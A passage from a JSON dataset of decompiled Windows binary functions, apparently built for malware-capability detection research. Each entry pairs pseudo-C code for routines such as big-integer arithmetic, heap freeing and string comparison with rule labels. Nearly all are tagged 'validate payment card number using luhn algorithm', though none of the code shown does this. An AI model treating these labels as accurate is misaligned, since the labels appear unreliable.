*(in_EAX + 0xc) = *(in_EAX + 0xc) - iStack32;\n            }\n            fcn.004223e0();\n            while (iVar3 = *(in_EAX + 8),  *(in_EAX + 8) = iVar3 + -1,  0 < iVar3) {\n                fcn.00421fc0();\n            }\n            fcn.00424170(uVar1);\n            return;\n        }\n        if (uVar2 == 0) {\n            iVar3 = sub.msvcrt.dll_strlen(uVar1);\n            *(in_EAX + 0xc) = iVar3 + -1;\n        }\n        else {\n            *(in_EAX + 0xc) = *(in_EAX + 0xc) + -1;\n        }\n        fcn.00422b20();\n        fcn.00424170(uVar1);\n        return;\n    }\n    fcn.00422260();\n    fcn.00424170(uVar1);\n    return;\n}\n",
        "token_count": 593
    },
    "004240b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004240b0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar3 = 0;\n    if (0x13 < param_1) {\n        iVar1 = 4;\n        do {\n            iVar1 = iVar1 * 2;\n            iVar3 = iVar3 + 1;\n        } while (iVar1 + 0xf < param_1);\n    }\n    piVar2 = fcn.004269b0(iVar3);\n    *piVar2 = iVar3;\n    return piVar2 + 1;\n}\n",
        "token_count": 145
    },
    "004240f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * fcn.004240f0(char *param_1, int32_t **param_2, int32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t iVar5;\n    \n    if (param_3 < 0x14) {\n        iVar5 = 0;\n    }\n    else {\n        iVar2 = 4;\n        iVar5 = 0;\n        do {\n            iVar2 = iVar2 * 2;\n            iVar5 = iVar5 + 1;\n        } while (iVar2 + 0xf < param_3);\n    }\n    piVar3 = fcn.004269b0(iVar5);\n    *piVar3 = iVar5;\n    cVar1 = *param_1;\n    *(piVar3 + 1) = cVar1;\n    piVar4 = piVar3 + 1;\n    while (cVar1 != '\\0') {\n        param_1 = param_1 + 1;\n        cVar1 = *param_1;\n        piVar4 = piVar4 + 1;\n        *piVar4 = cVar1;\n    }\n    if (param_2 != NULL) {\n        *param_2 = piVar4;\n    }\n    return piVar3 + 1;\n}\n",
        "token_count": 302
    },
    "00426440": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00426440(int32_t param_1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    \n    puVar5 = param_1 + 0x14;\n    puVar1 = puVar5 + *(param_1 + 0x10);\n    if (puVar1 <= puVar5) {\n        return 0;\n    }\n    uVar2 = *(param_1 + 0x14);\n    iVar4 = 0;\n    while( true ) {\n        if (uVar2 != 0) {\n            iVar3 = 0;\n            for (; (uVar2 & 1) == 0; uVar2 = uVar2 >> 1 | 0x80000000) {\n                iVar3 = iVar3 + 1;\n            }\n            return iVar4 + iVar3;\n        }\n        puVar5 = puVar5 + 1;\n        iVar4 = iVar4 + 0x20;\n        if (puVar1 <= puVar5) break;\n        uVar2 = *puVar5;\n    }\n    return iVar4;\n}\n",
        "token_count": 268
    },
    "00426490": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426490(void)\n\n{\n    uint8_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    \n    uVar2 = 0x30;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x549e00) = iVar3 + '\\x10';\n        puVar1 = iVar3 + 0x5061a7;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    uVar2 = 0x61;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x549e00) = iVar3 + '\\x1a';\n        puVar1 = iVar3 + 0x5061a0;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    uVar2 = 0x41;\n    iVar3 = 0;\n    do {\n        *(uVar2 + 0x549e00) = iVar3 + '\\x1a';\n        puVar1 = iVar3 + 0x506199;\n        uVar2 = *puVar1;\n        iVar3 = iVar3 + 1;\n    } while (*puVar1 != 0);\n    return;\n}\n",
        "token_count": 304
    },
    "00426af0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00426af0(int32_t param_1, uint32_t param_2, uint32_t param_3)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    int64_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    \n    iVar6 = 0;\n    iVar1 = *(param_1 + 0x10);\n    iVar7 = param_3 >> 0x1f;\n    do {\n        uVar2 = *(param_1 + 0x14 + iVar6 * 4);\n        iVar3 = uVar2 * param_2;\n        uVar4 = iVar3;\n        iVar5 = uVar4 + param_3;\n        param_3 = (iVar3 >> 0x20) + (param_2 >> 0x1f) * uVar2 + iVar7 + CARRY4(uVar4, param_3);\n        *(param_1 + 0x14 + iVar6 * 4) = iVar5;\n        iVar7 = 0;\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < iVar1);\n    if (param_3 != 0) {\n        if (*(param_1 + 8) == iVar1 || *(param_1 + 8) < iVar1) {\n            iVar6 = fcn.004269b0(*(param_1 + 4) + 1);\n            if (iVar6 == 0) {\n                return 0;\n            }\n            sub.msvcrt.dll_memcpy(iVar6 + 0xc, param_1 + 0xc, *(param_1 + 0x10) * 4 + 8);\n            fcn.00426a80(param_1);\n            param_1 = iVar6;\n        }\n        *(param_1 + 0x14 + iVar1 * 4) = param_3;\n        *(param_1 + 0x10) = iVar1 + 1;\n    }\n    return param_1;\n}\n",
        "token_count": 458
    },
    "00426be0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00426be0(uint param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.004269b0(1);\n    if (iVar1 != 0) {\n        *(iVar1 + 0x10) = 1;\n        *(iVar1 + 0x14) = param_1;\n    }\n    return;\n}\n",
        "token_count": 82
    },
    "00426c10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00426c10(int32_t param_1, int32_t param_2)\n\n{\n    uint32_t *puVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int64_t iVar5;\n    uint32_t *puVar6;\n    int32_t iVar7;\n    uint32_t *puVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    int32_t iVar12;\n    uint32_t *puVar13;\n    int32_t iVar15;\n    uint32_t *puVar16;\n    int32_t iVar17;\n    uint32_t uStack76;\n    uint32_t *puStack64;\n    uint32_t *puStack52;\n    int32_t iStack44;\n    uint32_t *puVar14;\n    \n    iVar17 = *(param_1 + 0x10);\n    iVar3 = *(param_2 + 0x10);\n    iVar12 = iVar3;\n    iVar15 = param_2;\n    if (iVar17 < iVar3) {\n        iVar12 = iVar17;\n        iVar15 = param_1;\n        param_1 = param_2;\n        iVar17 = iVar3;\n    }\n    iVar3 = iVar17 + iVar12;\n    iVar7 = fcn.004269b0((*(param_1 + 8) < iVar3) + *(param_1 + 4));\n    if (iVar7 != 0) {\n        puStack52 = iVar7 + 0x14;\n        puVar1 = puStack52 + iVar3;\n        for (puVar8 = puStack52; puVar8 < puVar1; puVar8 = puVar8 + 1) {\n            *puVar8 = 0;\n        }\n        puVar8 = iVar15 + 0x14;\n        puVar2 = puVar8 + iVar12;\n        while (puStack64 = puVar8,  puVar8 < puVar2) {\n            while( true ) {\n                puVar8 = puStack64 + 1;\n                uVar4 = *puStack64;\n                if (uVar4 == 0) break;\n                uStack76 = 0;\n                puVar13 = param_1 + 0x14;\n                puVar6 = puStack52;\n                do {\n                    puVar16 = puVar6;\n                    puVar14 = puVar13 + 1;\n                    iVar5 = uVar4 * *puVar13;\n                    uVar9 = iVar5;\n                    uVar10 = uVar9 + *puVar16;\n                    uVar11 = uVar10 + uStack76;\n                    uStack76 = (iVar5 >> 0x20) + CARRY4(uVar9, *puVar16) + CARRY4(uVar10, uStack76);\n                    *puVar16 = uVar11;\n                    puVar13 = puVar14;\n                    puVar6 = puVar16 + 1;\n                } while (puVar14 < param_1 + 0x14 + iVar17);\n                puStack52 = puStack52 + 1;\n                puVar16[1] = uStack76;\n                puStack64 = puVar8;\n                if (puVar2 <= puVar8) goto code_r0x00426d2f;\n            }\n            puStack52 = puStack52 + 1;\n        }\ncode_r0x00426d2f:\n        iStack44 = iVar3;\n        if (0 < iVar3) {\n            uVar4 = puVar1[-1];\n            iVar17 = iVar3;\n            while ((iStack44 = iVar17,  uVar4 == 0 && (iStack44 = iVar17 + -1,  iStack44 != 0))) {\n                uVar4 = puVar1[(iVar17 + -2) - iVar3];\n                iVar17 = iStack44;\n            }\n        }\n        *(iVar7 + 0x10) = iStack44;\n    }\n    return iVar7;\n}\n",
        "token_count": 891
    },
    "00427620": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00427620(char **param_1, char *param_2)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    char *pcVar3;\n    \n    pcVar3 = *param_1;\n    do {\n        cVar1 = *param_2;\n        pcVar3 = pcVar3 + 1;\n        if (cVar1 == 0) {\n            *param_1 = pcVar3;\n            return 1;\n        }\n        iVar2 = *pcVar3;\n        if (iVar2 - 0x41U < 0x1a) {\n            iVar2 = iVar2 + 0x20;\n        }\n        param_2 = param_2 + 1;\n    } while (iVar2 == cVar1);\n    return 0;\n}\n",
        "token_count": 176
    },
    "004a3910": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004a3910(int32_t param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t *piVar5;\n    int32_t *extraout_EDX;\n    int32_t **ppiVar6;\n    int32_t *unaff_EDI;\n    ulong uVar7;\n    int32_t iStack32;\n    \n    if ((param_1 - 0x60U <= *0x4f5ce4) || (*0x4f5ce4 + *0x4f5ce8 <= param_1 - 0x60U)) {\n    // WARNING: Could not recover jumptable at 0x00427908. Too many branches\n    // WARNING: Treating indirect jump as call\n        (*_sym.imp.msvcrt.dll_free)();\n        return;\n    }\n    if ((*0x4f59f4 == 0) || (iVar2 = fcn.00418d60(0x4f5cd8),  iVar2 == 0)) {\n        unaff_EDI = param_1 + -0x70;\n        if (*0x4f5ce0 == NULL) goto code_r0x00428db0;\n        iStack32 = *(param_1 + -0x70);\n        piVar1 = unaff_EDI + iStack32;\n        if (piVar1 < *0x4f5ce0) goto code_r0x00428db0;\n        piVar3 = (*0x4f5ce0)[1];\n        if (*0x4f5ce0 == piVar1) {\n            iVar2 = **0x4f5ce0;\n            *(param_1 + -0x6c) = piVar3;\n            *(param_1 + -0x70) = iStack32 + iVar2;\n            *0x4f5ce0 = unaff_EDI;\n            goto joined_r0x00428d90;\n        }\n        piVar4 = *0x4f5ce0;\n        if (piVar3 == NULL) {\n            piVar3 = NULL;\n            ppiVar6 = 0x4f5ce0;\n        }\n        else {\n            piVar5 = *0x4f5ce0;\n            if (piVar1 < piVar3) {\n                do {\n                    piVar4 = piVar3;\n                    piVar3 = piVar4[1];\n                    ppiVar6 = piVar5 + 1;\n                    if (piVar3 == NULL) break;\n                    piVar5 = piVar4;\n                } while (piVar1 < piVar3);\n            }\n            else {\n                ppiVar6 = 0x4f5ce0;\n            }\n        }\n        if (piVar3 == piVar1) {\n            iStack32 = iStack32 + *piVar3;\n            piVar4[1] = piVar3[1];\n        }\n        piVar1 = *ppiVar6;\n        uVar7 = CONCAT44(*piVar1, piVar1);\n        if (unaff_EDI != piVar1 + *piVar1) {\n            *(param_1 + -0x6c) = piVar1[1];\n            piVar1 = *ppiVar6;\n            *(param_1 + -0x70) = iStack32;\n            piVar1[1] = unaff_EDI;\n            goto joined_r0x00428d90;\n        }\n    }\n    else {\n        uVar7 = fcn.0042a720();\n    }\n    *uVar7 = (uVar7 >> 0x20) + iStack32;\njoined_r0x00428d90:\n    while ((*0x4f59f4 != 0 && (iVar2 = fcn.00418dc0(0x4f5cd8),  iVar2 != 0))) {\n        fcn.0042a750();\n        *0x4f5ce0 = extraout_EDX;\ncode_r0x00428db0:\n        *(param_1 + -0x6c) = *0x4f5ce0;\n        *0x4f5ce0 = unaff_EDI;\n    }\n    return;\n}\n",
        "token_count": 944
    },
    "00428bc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00428bc0(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4f5bb0 != '\\0') {\n        return 0x4f74a0;\n    }\n    iVar1 = fcn.004a39c0(0x4f5bb0);\n    if (iVar1 != 0) {\n        if (*0x4f59f4 != 0) {\n            fcn.00418d00(0x4f74a0);\n        }\n        fcn.004a3aa0(0x4f5bb0);\n        fcn.004014c0(0x4a43c0);\n    }\n    return 0x4f74a0;\n}\n",
        "token_count": 162
    },
    "00428c80": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00428c80(void)\n\n{\n    int32_t iVar1;\n    \n    if (*0x4f5bb8 != '\\0') {\n        return 0x4f74b0;\n    }\n    iVar1 = fcn.004a39c0(0x4f5bb8);\n    if (iVar1 == 0) {\n        return 0x4f74b0;\n    }\n    fcn.004a3aa0(0x4f5bb8);\n    fcn.004014c0(0x4a4420);\n    return 0x4f74b0;\n}\n",
        "token_count": 138
    },
    "0042b5d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0042b5d0(int32_t *param_1, uint param_2, uint param_3)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = sub.msvcrt.dll_strerror(param_3);\n    *param_1 = param_1 + 2;\n    iVar2 = -1;\n    if (iVar1 != 0) {\n        iVar2 = sub.msvcrt.dll_strlen(iVar1);\n        iVar2 = iVar2 + iVar1;\n    }\n    fcn.00490c10(iVar1, iVar2, 0);\n    return param_1;\n}\n",
        "token_count": 146
    },
    "0042c940": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.0042c940(int32_t *param_1, char param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    iVar2 = *param_1;\n    if (param_3 < *(iVar2 + -0xc)) {\n        cVar1 = *(iVar2 + param_3);\n        while (param_2 == cVar1) {\n            param_3 = param_3 + 1;\n            if (param_3 == *(iVar2 + -0xc)) goto code_r0x0042c96e;\n            cVar1 = *(iVar2 + param_3);\n        }\n    }\n    else {\ncode_r0x0042c96e:\n        param_3 = 0xffffffff;\n    }\n    return param_3;\n}\n",
        "token_count": 185
    },
    "0042eb60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0042eb60(int32_t arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.00474930(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0xc), &var_24h, arg_ch, arg_10h);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.00490c10(var_24h, var_20h + var_24h, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    do {\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.00433e60();\n        fcn.0048fe90();\n    } while( true );\n}\n",
        "token_count": 651
    },
    "0042ed90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.0042ed90(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint *arg_18h)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint32_t in_stack_ffffffb4;\n    uint *puVar2;\n    int32_t var_24h;\n    int32_t var_20h;\n    code *pcStack32;\n    code *var_ch;\n    uint var_bp_8h;\n    \n    var_ch = NULL;\n    puVar2 = &var_24h;\n    fcn.004740d0(in_stack_ffffffb4 & 0xffffff00, *(arg_8h + 0x10), &var_24h, arg_ch, arg_10h, arg_14h, *arg_18h, \n                 arg_18h[1]);\n    if (var_ch != NULL) {\n        *in_ECX = in_ECX + 2;\n        fcn.00490c10(var_24h, var_20h + var_24h, puVar2 & 0xffffff00);\n        if (var_ch != NULL) {\n            (*var_ch)(&var_24h);\n        }\n        return;\n    }\n    uVar1 = fcn.0049eb30(\"uninitialized __any_string\");\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (var_ch != NULL) {\n        (*var_ch)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    if (pcStack32 != NULL) {\n        (*pcStack32)(&var_24h);\n    }\n    fcn.0041b360(uVar1);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    fcn.004a34c0(uVar1);\n    fcn.0041b360(&var_24h);\n    fcn.0048f380();\n    do {\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.004a34c0(uVar1);\n        fcn.0041b360(&var_24h);\n        fcn.00433e60();\n        fcn.0048fe90();\n    } while( true );\n}\n",
        "token_count": 652
    },
    "004301f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_3ch\n// WARNING: Variable defined which should be unmapped: var_34h\n// WARNING: Variable defined which should be unmapped: var_2ch\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004301f0(uint arg_8h, uint arg_ch, uint32_t arg_10h, uint arg_14h, uint arg_18h, int32_t *arg_1ch)\n\n{\n    float10 fVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    uint unaff_retaddr;\n    uint in_stack_0000001c;\n    uint in_stack_00000020;\n    uint in_stack_00000024;\n    uint in_stack_00000028;\n    uint in_stack_0000002c;\n    uint in_stack_00000030;\n    uint in_stack_00000034;\n    uint in_stack_00000038;\n    uint in_stack_0000003c;\n    uint in_stack_00000040;\n    uint in_stack_00000044;\n    uint in_stack_00000048;\n    uint in_stack_0000004c;\n    uint in_stack_00000050;\n    uint in_stack_00000054;\n    uint in_stack_00000058;\n    uint in_stack_0000005c;\n    uint in_stack_00000060;\n    uint in_stack_00000064;\n    uint in_stack_00000068;\n    uint in_stack_0000006c;\n    uint32_t in_stack_ffffff78;\n    uint32_t in_stack_ffffff8c;\n    ushort in_stack_ffffff9e;\n    uint in_stack_ffffffa4;\n    uint in_stack_ffffffa8;\n    uint in_stack_ffffffac;\n    uint in_stack_ffffffb0;\n    uint in_stack_ffffffb4;\n    uint in_stack_ffffffb8;\n    uint var_40h;\n    uint var_3ch;\n    uint in_stack_ffffffc4;\n    uint *var_34h;\n    uint in_stack_ffffffcc;\n    uint var_2ch;\n    uint in_stack_ffffffd4;\n    uint in_stack_ffffffd8;\n    uint in_stack_ffffffdc;\n    uint var_1ch;\n    uint in_stack_ffffffe4;\n    uint in_stack_ffffffe8;\n    uint in_stack_ffffffec;\n    uint var_bp_ch;\n    \n    var_34h = &var_2ch;\n    fcn.00490cd0(*arg_1ch, arg_1ch[1] + *arg_1ch, in_stack_ffffff8c & 0xffffff00);\n    var_40h._0_1_ = arg_18h;\n    fVar1 = 0;\n    uVar2 = fcn.00472310(in_stack_ffffff78 & 0xffffff00, *(in_ECX + 8), arg_8h, arg_ch, arg_10h & 0xff, arg_14h, var_40h\n                         , SUB104(fVar1, 0), fVar1 >> 0x20, CONCAT22(in_stack_ffffff9e, fVar1 >> 0x40), &var_34h, \n                         in_stack_ffffffa4, in_stack_ffffffa8, in_stack_ffffffac, in_stack_ffffffb0, in_stack_ffffffb4, \n                         in_stack_ffffffb8, arg_18h, var_3ch, in_stack_ffffffc4, var_34h, in_stack_ffffffcc, var_2ch, \n                         in_stack_ffffffd4, in_stack_ffffffd8, in_stack_ffffffdc, 0x474020, in_stack_ffffffe4, \n                         in_stack_ffffffe8, in_stack_ffffffec, unaff_EBX, unaff_ESI, unaff_EDI, unaff_EBP, unaff_retaddr\n                         , arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, in_stack_0000001c, in_stack_00000020, \n                         in_stack_00000024, in_stack_00000028, in_stack_0000002c, in_stack_00000030, in_stack_00000034, \n                         in_stack_00000038, in_stack_0000003c, in_stack_00000040, in_stack_00000044, in_stack_00000048, \n                         in_stack_0000004c, in_stack_00000050, in_stack_00000054, in_stack_00000058, in_stack_0000005c, \n                         in_stack_00000060, in_stack_00000064, in_stack_00000068, in_stack_0000006c);\n    (*0x474020)(&var_34h);\n    return uVar2;\n}\n",
        "token_count": 1143
    },
    "00430e20": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.00430e20(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *piVar1;\n    bool bVar2;\n    uint32_t in_EAX;\n    uint32_t uVar3;\n    bool bVar4;\n    bool bVar5;\n    \n    piVar1 = *param_1;\n    bVar4 = piVar1 != NULL && *(param_1 + 1) == -1;\n    bVar5 = *(param_1 + 1) == -1;\n    if (bVar4) {\n        if (piVar1[2] < piVar1[3]) {\n            in_EAX = *piVar1[2];\n        }\n        else {\n            in_EAX = (**(*piVar1 + 0x24))();\n        }\n        bVar5 = false;\n        if (in_EAX == -1) {\n            *param_1 = NULL;\n            bVar5 = bVar4;\n        }\n    }\n    piVar1 = *param_2;\n    uVar3 = in_EAX & 0xffffff00;\n    bVar2 = piVar1 != NULL && *(param_2 + 1) == -1;\n    bVar4 = *(param_2 + 1) == -1;\n    if (bVar2) {\n        if (piVar1[2] < piVar1[3]) {\n            uVar3 = *piVar1[2];\n        }\n        else {\n            uVar3 = (**(*piVar1 + 0x24))();\n        }\n        bVar4 = false;\n        if (uVar3 == -1) {\n            *param_2 = NULL;\n            bVar4 = bVar2;\n        }\n    }\n    return uVar3 & 0xffffff00 | bVar5 == bVar4;\n}\n",
        "token_count": 409
    },
    "00430ec0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00430ec0(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            param_2 = *piVar1[2];\n        }\n        else {\n            param_2 = (**(*piVar1 + 0x24))();\n        }\n        if (param_2 == -1) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 157
    },
    "00430f10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __fastcall fcn.00430f10(uint param_1, uint32_t param_2)\n\n{\n    int32_t *piVar1;\n    int32_t **in_EAX;\n    \n    piVar1 = *in_EAX;\n    if ((param_2 == -1) && (piVar1 != NULL)) {\n        if (piVar1[2] < piVar1[3]) {\n            param_2 = *piVar1[2];\n        }\n        else {\n            param_2 = (**(*piVar1 + 0x24))();\n        }\n        if (param_2 == -1) {\n            *in_EAX = NULL;\n        }\n    }\n    return param_2;\n}\n",
        "token_count": 157
    },
    "00432500": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00432500(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *param_1;\n    if (iVar1 == 0) {\n        if (*0x4f59f4 == 0) {\n            iVar1 = *0x4f6ecc + 1;\n            *0x4f6ecc = iVar1;\n            *param_1 = iVar1;\n        }\n        else {\n            LOCK();\n            iVar1 = *0x4f6ecc + 1;\n            *0x4f6ecc = *0x4f6ecc + 1;\n            *param_1 = iVar1;\n        }\n    }\n    return iVar1 + -1;\n}\n",
        "token_count": 164
    },
    "004354f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __thiscall fcn.004354f0(int32_t *param_1, char param_2, uint32_t param_3)\n\n{\n    char cVar1;\n    \n    if (param_3 < param_1[1]) {\n        cVar1 = *(*param_1 + param_3);\n        while (param_2 == cVar1) {\n            param_3 = param_3 + 1;\n            if (param_3 == param_1[1]) goto code_r0x0043551e;\n            cVar1 = *(*param_1 + param_3);\n        }\n    }\n    else {\ncode_r0x0043551e:\n        param_3 = 0xffffffff;\n    }\n    return param_3;\n}\n",
        "token_count": 165
    },
    "004359f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.004359f0(uint *param_1, uint param_2)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar1 = param_1[1];\n    uVar2 = sub.msvcrt.dll_strlen(param_2);\n    uVar3 = uVar1;\n    if (uVar2 <= uVar1) {\n        uVar3 = uVar2;\n    }\n    if ((uVar3 != 0) && (iVar4 = sub.msvcrt.dll_memcmp(*param_1, param_2, uVar3),  iVar4 != 0)) {\n        return iVar4;\n    }\n    return uVar1 - uVar2;\n}\n",
        "token_count": 177
    },
    "00436d40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.00436d40(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = sub.msvcrt.dll_strcoll(param_1, param_2);\n    return iVar1 != 0 | iVar1 >> 0x1e;\n}\n",
        "token_count": 67
    },
    "00436d70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
